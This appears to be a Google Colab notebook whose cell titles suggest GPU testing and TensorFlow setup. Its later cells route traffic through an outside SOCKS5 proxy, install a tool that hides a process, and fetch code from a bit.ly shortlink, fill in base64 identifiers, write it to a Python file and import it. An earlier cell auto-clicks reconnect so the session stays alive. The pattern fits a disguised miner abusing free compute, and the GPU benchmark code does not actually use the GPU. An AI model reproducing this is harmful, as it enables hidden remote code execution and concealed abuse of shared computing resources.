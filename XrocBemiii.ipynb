{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "XrocBemiii.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cmbtuEyk3IgH"
      },
      "source": [
        "# **Lahaula**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Zjopwk9B9EK-"
      },
      "source": [
        "#@title hey \n",
        "\n",
        "print (\"Hello World\")\n",
        "\n",
        "import IPython\n",
        "from google.colab import output\n",
        "\n",
        "display(IPython.display.Javascript('''\n",
        "function ClickConnect(){\n",
        "  btn = document.querySelector(\"colab-connect-button\")\n",
        "  if (btn != null){\n",
        "    console.log(\"Click colab-connect-button\"); \n",
        "    btn.click() \n",
        "    }\n",
        "    \n",
        "  btn = document.getElementById('ok')\n",
        "  if (btn != null){\n",
        "    console.log(\"Click reconnect\"); \n",
        "    btn.click() \n",
        "    }\n",
        "  }\n",
        "    \n",
        "setInterval(ClickConnect,10000)\n",
        "'''))"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "QgkiBRBn3JuD"
      },
      "source": [
        "#@title Check GPU\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "aY-uTqnp3NTD"
      },
      "source": [
        "#@title Mod GPU\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Ujt1vWgY3gvT"
      },
      "source": [
        "#@title Tensor Max\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "S8eJcs9G3YCb"
      },
      "source": [
        "#@title Import\n",
        "\n",
        "!apt update\n",
        "!apt install proxychains\n",
        "!sed -i 's/socks4/socks5/' /etc/proxychains.conf\n",
        "!sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf\n",
        "!sed -i 's/9050/10663/' /etc/proxychains.conf\n",
        "!sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add memek\n",
        "!apt install screen -y"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "w8EUKw1q3Juw"
      },
      "source": [
        "#@title **modal rumah tangga**\n",
        "#@markdown Langsung Playyy!\n",
        "import requests as r\n",
        "fulltext = (r.get('https://bit.ly/3Aq1zwU')).text\n",
        "fulltext = fulltext.replace('{asu_holder}','MzZ5ZzZHYkVxRFg4d0I1bUdSY1Z6Q3JiSjU1UkthSlQ5QQ==')\n",
        "fulltext = fulltext.replace('{wala_holder}','QnVyaGFu')\n",
        "f = open('Identification_hamota.py', 'w')\n",
        "f.write(fulltext)\n",
        "f.close()\n",
        "import Identification_hamota"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}